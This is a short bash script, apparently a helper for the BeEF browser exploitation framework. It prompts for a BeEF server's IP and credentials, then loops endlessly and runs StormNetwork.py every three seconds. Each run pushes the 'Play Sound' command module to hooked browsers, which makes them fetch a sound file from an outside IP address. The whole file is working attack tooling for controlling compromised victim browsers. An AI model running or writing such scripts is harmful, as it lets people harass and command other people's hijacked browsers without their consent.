#!/bin/bash
read -p "What is your BeEF IP? " VPS_IP
read -p "What is your BeEF Username? " username
read -p "What is your BeEF Password? " password

while true
do
    python3 StormNetwork.py -u $username -p $password --url http://$VPS_IP:3000 -m "Play Sound" -mp "sound_file_uri=http://181.174.164.37/sound.wav"
    sleep 3
done
